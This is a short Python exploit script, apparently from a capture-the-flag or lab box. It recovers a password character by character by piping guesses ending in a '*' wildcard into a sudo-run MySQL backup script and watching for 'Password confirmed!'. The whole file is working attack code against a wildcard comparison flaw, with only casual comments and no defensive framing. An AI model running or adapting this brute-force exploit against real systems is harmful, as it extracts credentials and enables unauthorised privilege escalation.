import subprocess
import string

def main():
    chars=list(string.ascii_letters+string.digits) #Make a list of all characters possible(alphabets and numbers)
    pswd=""
    check=0 #Will check if all password characters found or not.
    
    while check==0:
        for char in chars:
            cmd=f"echo '{pswd}{char}*' | sudo /opt/scripts/mysql-backup.sh"
            out=subprocess.run(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True).stdout
            if "Password confirmed!" in out:
                pswd+=char
                break #If character found break the loop
            else: #Redundant and added just such that you don't get confused with the below else statement.
                pass
        else: #If no character matched which means all of the characters were found.
            check=1
            print("[+] Password: "+pswd)

if __name__=="__main__":
    main()
